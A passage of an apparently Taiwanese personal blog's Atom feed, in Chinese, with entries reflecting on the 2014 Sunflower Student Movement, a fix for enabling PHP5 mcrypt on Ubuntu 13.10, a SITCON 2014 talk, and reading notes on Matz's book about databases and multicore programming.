&lt;p&gt;整個社會&lt;br /&gt;
就像一個有著幾億行程式碼的超大型專案&lt;br /&gt;
Bug 大概永遠也抓不完吧&lt;br /&gt;
不知道這次的 Compiler 能抓出多少 Bug&lt;br /&gt;
但就算抓出來了以後也還是得有人去改寫程式碼&lt;br /&gt;
這個社會需要更多擁有工程師思維的人一起幫忙改進它啊&lt;br /&gt;
才發現把程式寫好跟讓這個社會變好原來根本是同一個道理  &lt;/p&gt;
&lt;p&gt;這一個月來&lt;br /&gt;
被社會化的程度突飛猛進&lt;br /&gt;
媒體識讀、公民參與、閱讀法條&lt;br /&gt;
再度體會唸書考試跟實作參與完全是兩回事&lt;br /&gt;
我還是比較喜歡後者 雖然很累  &lt;/p&gt;</summary><category term="Life"></category><category term="programming"></category><category term="ImproveSociety"></category></entry><entry><title>[Life] 318 太陽花學運有感</title><link href="https://blog.m157q.tw/posts/2014/04/07/life-318-tai-yang-hua-xue-yun-you-gan/" rel="alternate"></link><published>2014-04-07T15:23:00+08:00</published><updated>2014-04-07T15:23:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-04-07:posts/2014/04/07/life-318-tai-yang-hua-xue-yun-you-gan/</id><summary type="html">&lt;p&gt;&lt;a href="http://newtalk.tw/news/2014/04/07/46103.html"&gt;318太陽花學運：週四下午6時退場&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;退場不是結束。  &lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;也許好的壞的都在蘊釀&lt;br /&gt;
藉由這次318太陽花學運&lt;br /&gt;
喚起年輕及年長一輩對政治的關心及監督民意代表&lt;br /&gt;
至少已經達到一定程度的水準&lt;br /&gt;
至少以前一直不關心政治的我是被深深的震憾到了  &lt;/p&gt;
&lt;p&gt;看到了台灣媒體有多麼的黑暗&lt;br /&gt;
看到了媒體識讀有多麼的重要&lt;br /&gt;
看到了真正的民主有多麼的混亂&lt;br /&gt;
學到了如何身為一個真正的公民&lt;br /&gt;
遇到政府欺瞞人民時應該挺身而出&lt;br /&gt;
而不是視而不見和漠不關心&lt;br /&gt;
而不是每天只管好自己&lt;br /&gt;
只會唸自己的書，只會賺自己的錢&lt;br /&gt;
柏拉圖已經告訴我們&lt;br /&gt;
「拒絕參與政治的懲罰之一，就是被糟糕的人統治。」&lt;br /&gt;
愛因斯坦也已經告訴我們&lt;br /&gt;
「這世界不會被那些作惡多端的人毀滅，而是冷眼旁觀、選擇保持緘默的人。」  &lt;/p&gt;
&lt;p&gt;也有很多話想對爸媽和大人們說&lt;br /&gt;
政黨雖然是兩大黨 但這個社會不是只有藍綠兩種顏色&lt;br /&gt;
不要再叫我們「只管好自己就好，其他都不用管」&lt;br /&gt;
二戰德國神父 Martin Niemöller 已經告訴我們&lt;br /&gt;
「到時候就沒人為你說話了。」&lt;br /&gt;
請你們相信一個二十幾歲的成年人已經有一定的是非價值觀&lt;br /&gt;
已經知道自己在做什麼 已經不再是需要百般呵護的小孩了&lt;br /&gt;
我知道你們擔心我的安危 但我也跟你們保證我會注意自己的安全&lt;br /&gt;
不要再只看固定同一家媒體的報導了&lt;br /&gt;
看看其他家的報導並多加查證比較 而不是一股腦兒相信&lt;br /&gt;
我不是不知道學運的成果被有心的政黨人士利用&lt;br /&gt;
這絕對不是我們願意的啊  &lt;/p&gt;
&lt;p&gt;接下來就是看檯面上的政治人物如何處理了&lt;br /&gt;
不希望看到坐收漁翁之利和收割學運果實的舉動&lt;br /&gt;
雖然在現場就已經看到很多了...&lt;br /&gt;
而且年底選戰將近，大概也是難以避免&lt;br /&gt;
又或許會有秋後算帳  &lt;/p&gt;
&lt;p&gt;這個社會就是如此&lt;br /&gt;
改變從來無法迅速&lt;br /&gt;
希望年輕一輩的我們能夠藉由這次的經驗&lt;br /&gt;
更加關心這個國家的未來&lt;br /&gt;
也希望我們將來不會成為自己現在憎恨的人一樣&lt;br /&gt;
不要成為「換了位置就換了腦袋」的人  &lt;/p&gt;
&lt;p&gt;雖然平常許多人和我一樣都稱呼台灣為「鬼島」&lt;br /&gt;
對於這塊土地上發生許多不公不義的事都消極抱怨&lt;br /&gt;
時不時就嚷著畢業以後要逃離鬼島出國發展  &lt;/p&gt;
&lt;p&gt;但事實證明了&lt;br /&gt;
該挺身而出的時候，我們不會膽怯。&lt;br /&gt;
畢竟生於斯，長於斯 對於這塊土地上的人事物還是有感情的  &lt;/p&gt;</summary><category term="Life"></category><category term="CongressOccupied"></category></entry><entry><title>Enable mCrypt in PHP5 on Ubuntu 13.10 for Apache</title><link href="https://blog.m157q.tw/posts/2014/03/27/enable-mcrypt-in-php5-on-ubuntu-1310-for-apache/" rel="alternate"></link><published>2015-10-26T14:59:00+08:00</published><updated>2015-10-26T14:59:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-03-27:posts/2014/03/27/enable-mcrypt-in-php5-on-ubuntu-1310-for-apache/</id><summary type="html">&lt;p&gt;剛剛室友問網安作業  &lt;/p&gt;
&lt;p&gt;弄了老半天 網頁都是一片空白  &lt;/p&gt;
&lt;p&gt;後來乾脆直接寫在 .php 裏面  &lt;/p&gt;
&lt;p&gt;然後用 command line php 執行  &lt;/p&gt;
&lt;p&gt;結果問題出在  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;PHP Fatal Error: Undefined function mcrypt_encrypt()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;看起來就是 mcrypt module 沒被 include 進來  &lt;/p&gt;
&lt;p&gt;環境是 Ubuntu 13.10  &lt;/p&gt;
&lt;p&gt;開 &lt;code&gt;/etc/php5/apache2/php.ini&lt;/code&gt; 也沒看到 &lt;code&gt;mcrypt.so&lt;/code&gt; 可以拿掉註解  &lt;/p&gt;
&lt;p&gt;最後請教 Google 大神  &lt;/p&gt;
&lt;p&gt;發現這篇 &lt;a href="http://stackoverflow.com/questions/19446679/mcrypt-not-present-after-ubuntu-upgrade-to-13-10"&gt;mCrypt not present after Ubuntu upgrade to 13.10&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;看起來是 Ubuntu 13.10 特有的問題 應該是位置改了之類的吧  &lt;/p&gt;
&lt;p&gt;底下有回應提到解法  &lt;/p&gt;
&lt;p&gt;簡記一下：  &lt;/p&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;$ sudo apt-get install php5-mcrypt&lt;/code&gt; 確認有安裝 &lt;code&gt;php5-mcrypt&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo ln -s /etc/php5/conf.d/mcrypt.ini /etc/php5/mods-available&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo php5enmod mcrypt&lt;/code&gt; 這個指令會自動幫你在 &lt;code&gt;/etc/php5/apache2/conf.d&lt;/code&gt; 底下建一個 &lt;code&gt;mcrypt.ini&lt;/code&gt; 指向 &lt;code&gt;/etc/php5/mods-available/mcrypt.ini&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo service apache2 restart&lt;/code&gt; 重啟 Apache server  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;應該就可以在網頁上順利使用 mcrypt 系列的 function 了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;--珍惜生命，遠離 Ubuntu--&lt;/h4&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/19446679/mcrypt-not-present-after-ubuntu-upgrade-to-13-10"&gt;mCrypt not present after Ubuntu upgrade to 13.10&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="PHP"></category><category term="Ubuntu"></category><category term="Apache"></category><category term="mCrypt"></category><category term="sysadmin"></category></entry><entry><title>SITCON 2014 - 一年半前不會寫網站的菜鳥的故事</title><link href="https://blog.m157q.tw/posts/2014/03/16/sitcon-2014-yi-nian-ban-qian-bu-hui-xie-wang-zhan-de-cai-niao-de-gu-shi/" rel="alternate"></link><published>2015-10-28T12:56:00+08:00</published><updated>2015-10-28T12:56:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-03-16:posts/2014/03/16/sitcon-2014-yi-nian-ban-qian-bu-hui-xie-wang-zhan-de-cai-niao-de-gu-shi/</id><summary type="html">&lt;h2&gt;Slides on Speaker Deck&lt;/h2&gt;
&lt;script async class="speakerdeck-embed" data-id="45b691608e54013146051a945ae20cc0" data-ratio="1.33333333333333" src="//speakerdeck.com/assets/embed.js"&gt;&lt;/script&gt;

&lt;hr /&gt;
&lt;h2&gt;Thought&lt;/h2&gt;
&lt;p&gt;去年第一屆 SITCON (2013) 沒搶到票，&lt;br /&gt;
有人送票給我以後，我卻突然臨時有事不能去。&lt;br /&gt;
今年因為怕搶不到票的悲劇重新上演，就想說直接來投稿好了。&lt;br /&gt;
投稿者會得到一組 VIP Code，不用搶票。&lt;br /&gt;
(其實我忘記去年十月參加 &lt;a href="http://hackgen.sitcon.org/"&gt;HackGen&lt;/a&gt;，會贈送一組 VIP Code 了)  &lt;/p&gt;
&lt;p&gt;結果2月中旬左右就被通知投稿被選上了，&lt;br /&gt;
在 SITCON 2014 當天要在中研院講一場。&lt;br /&gt;
蠻開心也蠻緊張的，以前來中研院都是坐在台下，看台上人演講，&lt;br /&gt;
這次要換自己體驗一下站在台上的感覺。  &lt;/p&gt;
&lt;p&gt;SITCON 2014 網路報名當天，&lt;br /&gt;
想說還是來試試看這次的票好不好搶，&lt;br /&gt;
結果因為 &lt;a href="https://kktix.com/"&gt;KKTIX&lt;/a&gt; (前身為 Registrano)&lt;br /&gt;
的售票機制和以往不同，&lt;br /&gt;
導致這次的票根本不用用搶的，&lt;br /&gt;
我連開好幾個分頁就拿了 4~5 張，&lt;br /&gt;
於是開始送票給社團的學弟妹和忘記搶票的人，&lt;br /&gt;
並擅自把 SITCON 訂為社團出遊日 XDDD&lt;br /&gt;
--絕對不是要他們來看我演講--&lt;br /&gt;
最後也在報名截止前兩天，&lt;br /&gt;
把手上的兩組 VIP Code 送出去給有需要的人  &lt;/p&gt;</summary><category term="Conf"></category><category term="Web"></category><category term="SITCON"></category></entry><entry><title>《代碼的未來》</title><link href="https://blog.m157q.tw/posts/2014/03/10/the-future-of-computing/" rel="alternate"></link><published>2015-10-26T12:08:00+08:00</published><updated>2015-10-26T12:08:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-03-10:posts/2014/03/10/the-future-of-computing/</id><summary type="html">&lt;h3&gt;The Future of Computing by Matz&lt;/h3&gt;
&lt;p&gt;本書作者為 Ruby 之父松本行弘(Matz)  &lt;/p&gt;
&lt;p&gt;中譯本連結：&lt;a href="http://www.books.com.tw/products/CN11004414"&gt;博客來-圖靈程序設計叢書：代碼的未來&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;這本書裡面介紹了很多我都不知道的東西  &lt;/p&gt;
&lt;p&gt;書的撰寫時間點是 2013 年 4 月左右  &lt;/p&gt;
&lt;p&gt;有些書裡面描述的東西（我沒聽過的）在當時已經出現了一兩年  &lt;/p&gt;
&lt;p&gt;而通常會寫成書的東西都已經舊了  &lt;/p&gt;
&lt;p&gt;顯示我知道的東西實在還是太少  &lt;/p&gt;
&lt;p&gt;因為快唸完了才覺得應該要筆記起來  &lt;/p&gt;
&lt;p&gt;所以是從第五章開始（本書一共六章）  &lt;/p&gt;
&lt;p&gt;推薦買來看看（雖然我是跟朋友借的）  &lt;/p&gt;
&lt;p&gt;不過建議不喜歡 Ruby 的人不要買  &lt;/p&gt;
&lt;p&gt;因為裡面很多例子都是用 Ruby 來舉例（畢竟作者是 Ruby 的發明人）  &lt;/p&gt;
&lt;p&gt;不過其實如果真的很討厭 Ruby 的話  &lt;/p&gt;
&lt;p&gt;把用 Ruby 舉例的部分跳過還是有很多東西值得看的  &lt;/p&gt;
&lt;!--more--&gt;

&lt;h1&gt;Ch5. 支持 Big Data 的儲存技術&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CAP 原理：在大規模的環境中，以下三種特性只能同時滿足其中兩個。  &lt;ul&gt;
&lt;li&gt;Consistency（一致性）  &lt;/li&gt;
&lt;li&gt;Availability（可用性）  &lt;/li&gt;
&lt;li&gt;Partition Tolerance（分裂容忍性）  &lt;/li&gt;
&lt;li&gt;其中 Availability 是不能捨棄的，而在分散式計算的環境中，Partition Tolerance 其實也是不能捨棄的，所以唯一能捨棄的就只有 Consistency ，因此也造就了之後的 NoSQL 。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Relational Database 的特性：ACID，比較重視保持嚴格的一致性。  &lt;ul&gt;
&lt;li&gt;Atomicity：對於數據的操作只允許“全部完成”或“完全未作改變”  &lt;/li&gt;
&lt;li&gt;Consistency：DB 的狀態必須永遠滿足給定的條件，當某操作無法滿足執行條件時就會被取消  &lt;/li&gt;
&lt;li&gt;Isolation：不能被其他操作干涉以及避免對其它操作造成影響  &lt;/li&gt;
&lt;li&gt;Durability：操作完成時，其結果會被保存且不會遺失  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NoSQL 的特性：BASE，比較重視可用性，沒那麼重視一致性，只要最終能夠達成目標即可。  &lt;ul&gt;
&lt;li&gt;Basically Available：比較重視可用性  &lt;/li&gt;
&lt;li&gt;Soft-state：不追求狀態的嚴密性  &lt;/li&gt;
&lt;li&gt;Eventually consistent：最終達到一致性即可  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NoSQL  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Key-Value DB  &lt;ul&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;memcached  &lt;/li&gt;
&lt;li&gt;memcachedb  &lt;/li&gt;
&lt;li&gt;ROMA  &lt;/li&gt;
&lt;li&gt;Flare  &lt;/li&gt;
&lt;li&gt;kumofs (written in C++)  &lt;/li&gt;
&lt;li&gt;Redis (written in C)  &lt;/li&gt;
&lt;li&gt;TokyoTyrant  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Document-oriented_database"&gt;Document-Oriented DB&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Feature  &lt;ul&gt;
&lt;li&gt;Value 儲存的部分不是單純的 String 或 Number，而是擁有結構的 Document  &lt;/li&gt;
&lt;li&gt;不需要 DB Schema  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;XML(eXtended Markup Language)  &lt;/li&gt;
&lt;li&gt;JSON(JavaScript Object Notation)  &lt;/li&gt;
&lt;li&gt;CouchDB  &lt;ul&gt;
&lt;li&gt;RESTful(REST: Representational State Transfer)  &lt;/li&gt;
&lt;li&gt;Erlang  &lt;/li&gt;
&lt;li&gt;JSON  &lt;/li&gt;
&lt;li&gt;無法實現 RDB 中的 Join  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MongoDB  &lt;ul&gt;
&lt;li&gt;Combining the best features of document databases, key-value stores, and RDBMSes.  &lt;/li&gt;
&lt;li&gt;提供多語言的 API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Object-Oriented DB  &lt;ul&gt;
&lt;li&gt;Feature  &lt;ul&gt;
&lt;li&gt;將 OO 語言中的 Object 直接進行永久地保存，就算電腦關機後也不會消失，除存在硬碟中  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;Db4o  &lt;/li&gt;
&lt;li&gt;ZopeDB  &lt;/li&gt;
&lt;li&gt;ObjectStore  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MongoDB  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;born in 2009.  &lt;/li&gt;
&lt;li&gt;mongod  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ sudo mongod --dbpath /var/db/mongo&lt;/code&gt; use /var/db/mongo to store db files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;mongo command  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ mongo&lt;/code&gt; for using mongo shell  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ rlwrap mongo&lt;/code&gt; 為 mongo command 增加行編輯的功能  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt; use $db&lt;/code&gt; swicth to $db (if not exists, mongo will create a new one)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt; db.$collection_name.save($JSON)&lt;/code&gt; insert  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt; db.$collection_name.find($JSON)&lt;/code&gt; find in $JSON  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt; db.bench.ensureIndex({j:1}, {unique: ture})&lt;/code&gt; create index for j  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;沒有固定的 DB Schema  &lt;/li&gt;
&lt;li&gt;儲存結構  &lt;ul&gt;
&lt;li&gt;Database  &lt;/li&gt;
&lt;li&gt;Collection  &lt;/li&gt;
&lt;li&gt;Document  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use JavaScript  &lt;/li&gt;
&lt;li&gt;Support &lt;strong&gt;Atomic operation &amp;amp; optimistic concurrency control&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Support Distributed Environment  &lt;/li&gt;
&lt;li&gt;Compare with SQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;bench&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;in MySQL  &lt;/p&gt;
&lt;p&gt;and  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;db&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bench&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;find&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;in MongoDB  &lt;/p&gt;
&lt;p&gt;are equal.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Leaky abstraction  &lt;ul&gt;
&lt;li&gt;當 object 的調用越來越頻繁和複雜時，產生性能上的問題，導致 RDM 中的 Record 並沒有真的成為  object，在特殊的情況下，會暴露出抽象化的紕漏。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;OD Mapper (Object Document Mapper)  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SQL DB 的反擊  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sharding 技術  &lt;/li&gt;
&lt;li&gt;Spider  &lt;ul&gt;
&lt;li&gt;作者為 ST Global 公司的 Kentoku Shiba  &lt;/li&gt;
&lt;li&gt;為 MySQL 提供分割功能  &lt;/li&gt;
&lt;li&gt;和 InnoDB, MyISAM 一樣，為 MySQL 儲存引擎中的一種  &lt;/li&gt;
&lt;li&gt;邏輯和 DB 分離  &lt;/li&gt;
&lt;li&gt;可維護性高  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Michael Stonebraker - RDB 之父  &lt;ul&gt;
&lt;li&gt;最早的 RDB - Ingres 的開發者  &lt;/li&gt;
&lt;li&gt;Ingres -&amp;gt; Postgres -&amp;gt; PostgreSQL  &lt;/li&gt;
&lt;li&gt;Sybase 和 Microsoft SQL Server 都繼承了 Ingers 的 Code  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DB 性能的四大瓶頸  &lt;ul&gt;
&lt;li&gt;Logging  &lt;ul&gt;
&lt;li&gt;Log 需要對硬碟寫入，速度緩慢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Buffer Management  &lt;ul&gt;
&lt;li&gt;需要管理內容是寫入硬碟或是 RAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Locking  &lt;ul&gt;
&lt;li&gt;在對 Record 進行操作前，必須加上 Lock ，防止其他 thread 對 Record 進行修改  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Latching  &lt;ul&gt;
&lt;li&gt;對共享的資料結構進行存取時必須使用的排他方式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VoltDB  &lt;ul&gt;
&lt;li&gt;比傳統的 RDBMS 高出幾十倍的性能  &lt;/li&gt;
&lt;li&gt;線性可擴展性  &lt;/li&gt;
&lt;li&gt;以 SQL 作為 DBMS 接口  &lt;/li&gt;
&lt;li&gt;ACID 特性  &lt;/li&gt;
&lt;li&gt;可 365/24 全天候工作的高可用性  &lt;/li&gt;
&lt;li&gt;在 2 ~ 12 個 Node 的環境下能夠發揮最大效率(少量的 node 就可實現高超的性能)  &lt;/li&gt;
&lt;li&gt;性能高超的原因  &lt;ul&gt;
&lt;li&gt;將資料儲存在 RAM 而非硬碟  &lt;ul&gt;
&lt;li&gt;排除 Logging 和 Buffer Management 瓶頸  &lt;/li&gt;
&lt;li&gt;透過將 RAM 中儲存的資料複製到其他電腦，避免意外關機遺失資料，以保持 Durability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DB 分成多個 partitions 管理，每個 partition 都有獨立的 thread 進行管理，因為每個 partition 都只有一個 thread 對其進行操作，所以不用加上 Lock 和 Latch  &lt;ul&gt;
&lt;li&gt;解決 Locking 和 Latching 瓶頸  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;為了性能優化，把所有 Transaction 都事先儲存，無法從 Client 端進行 SQL Query（貌似實際上可以，但不推薦）  &lt;/li&gt;
&lt;li&gt;必須用 Java 撰寫對 VoltDB Query 的 client function  &lt;/li&gt;
&lt;li&gt;因為存在 RAM 中，所以儲存量大小受到 RAM 的限制，而且資料遺失的危險性也比將資料存在硬碟中的傳統 RDBMS 更危險。  &lt;/li&gt;
&lt;li&gt;靈活性沒有 NoSQL 來的高  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Ch6. 多核時代的編程&lt;/h1&gt;
&lt;h4&gt;6.1 摩爾定律&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;摩爾(Gordon Moore)定律  &lt;ul&gt;
&lt;li&gt;「IC 中的 transistor 數量，大約每兩年增加一倍」  &lt;/li&gt;
&lt;li&gt;1965年的原始論文中寫的是每年增加一倍，1975年發表的論文中改成每兩年增加一倍  &lt;/li&gt;
&lt;li&gt;David House：「LSI 的性能每 18 個月增加一倍」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dennard Scaling  &lt;ul&gt;
&lt;li&gt;CPU 中的 MOS (Metal-Oxide Semiconductor) 在製程縮減到原來的 1/2 時，就可以實現 2 倍的開關速度和 1/4 的耗電量  &lt;/li&gt;
&lt;li&gt;由 IBM 的 Robert Dennard 發現（Dennard 於 1968 年發明了 DRAM）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RISC 架構  &lt;ul&gt;
&lt;li&gt;ex: MIPS, SPARC, ARM, PlayStation3 主機中的 Cell 晶片  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CISC 微指令轉換技術  &lt;/li&gt;
&lt;li&gt;Hyper Threading / Simulation Multi-Threading  &lt;ul&gt;
&lt;li&gt;沒有相互依賴關係的多個指令同時進行  &lt;/li&gt;
&lt;li&gt;最多大概提升 30% 的 CPU 性能，只需要增加 5% 的 transistor 數量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-core  &lt;ul&gt;
&lt;li&gt;Homogeneous multi-core  &lt;/li&gt;
&lt;li&gt;Heterogeneous multi-core (CPU + GPU + ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many-core 正在研究中  &lt;/li&gt;
&lt;li&gt;摩爾定律的極限  &lt;ul&gt;
&lt;li&gt;導線寬度比感光光源的波長還小  &lt;ul&gt;
&lt;li&gt;必須在透鏡和晶圓中間加入純水，縮短光源的波長  &lt;/li&gt;
&lt;li&gt;波長更短的遠紫外線或X射線，很難用透鏡聚焦，可以使用反射鏡替代，但曝光機率和成本都會上升  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;開始進入量子物理的範圍，穿隧效應造成滲漏電流  &lt;/li&gt;
&lt;li&gt;熱密度的問題  &lt;/li&gt;
&lt;li&gt;需求的飽和  &lt;ul&gt;
&lt;li&gt;一般的大眾使用電腦所需要的性能不太需要主頻極高的 CPU  &lt;/li&gt;
&lt;li&gt;當然在 3D 圖形、視訊編碼和科學計算方面是永遠都不夠用的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;結論: 摩爾定律的終結，代表著硬體不再像以往進步的如此神速。&lt;br /&gt;
軟體工程師在往後的日子，勢必得付出更多心力在優化方面，&lt;br /&gt;
不能再像以前只依靠硬體的進步就能夠解決許多效能上的問題。&lt;br /&gt;
作者將這現象稱為「免費午餐的終結」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;6.2 UNIX pipeline&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;JCL (Job Control Language)  &lt;/li&gt;
&lt;li&gt;Shell  &lt;/li&gt;
&lt;li&gt;Script  &lt;/li&gt;
&lt;li&gt;Stream pipeline  &lt;ul&gt;
&lt;li&gt;pipeline 在多核的環境下非常有用  &lt;/li&gt;
&lt;li&gt;xargs  &lt;ul&gt;
&lt;li&gt;-P : 要開的 Process 數量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;很多時候瓶頸不是在 CPU 的性能，而是在其周邊裝置。在這樣的情況下，增加 CPU 的數量也不會改善效能。  &lt;/li&gt;
&lt;li&gt;阿姆達爾定律  &lt;ul&gt;
&lt;li&gt;估算透過多核 CPU 平行計算能夠獲得多少性能提升的經驗法則  &lt;/li&gt;
&lt;li&gt;「透過多核平行計算所獲得的系統效能提升效果，會隨著無法平行的部分而產生飽和。」  &lt;/li&gt;
&lt;li&gt;速度提升比例的公式  &lt;ul&gt;
&lt;li&gt;1 / [(1 - P) + P / N]  &lt;/li&gt;
&lt;li&gt;P = 可平行化的比例  &lt;/li&gt;
&lt;li&gt;N = CPU 的數量（並行度）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ccache  &lt;ul&gt;
&lt;li&gt;將編譯的結果存入 cache 以達到大幅降低再次編譯時所花費的時間  &lt;/li&gt;
&lt;li&gt;用法: &lt;code&gt;$ CC='ccache gcc' make -j4&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;將結果存在該資料夾底下的 .ccache/ 中  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;distcc  &lt;ul&gt;
&lt;li&gt;利用多台電腦來改善編譯速度的工具  &lt;/li&gt;
&lt;li&gt;要在 ~/.distcc/hosts 中寫好要用哪些主機  &lt;/li&gt;
&lt;li&gt;被用到的主機必須要執行 distccd 或者可以透過 ssh 登入  &lt;/li&gt;
&lt;li&gt;透過 ssh 的安全性較高，但因為加密的關係，編譯效能會下降 25% 左右。  &lt;/li&gt;
&lt;li&gt;透過 distccd 的話，因為沒有認證機制，安全性較低，但編譯效能較快。  &lt;/li&gt;
&lt;li&gt;用法 &lt;code&gt;$ CC='distcc gcc' make -j4&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Ch6.3 Non Blocking I/O&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Event Driven Model  &lt;/li&gt;
&lt;li&gt;read(2), select, O_NONBLOCK  &lt;/li&gt;
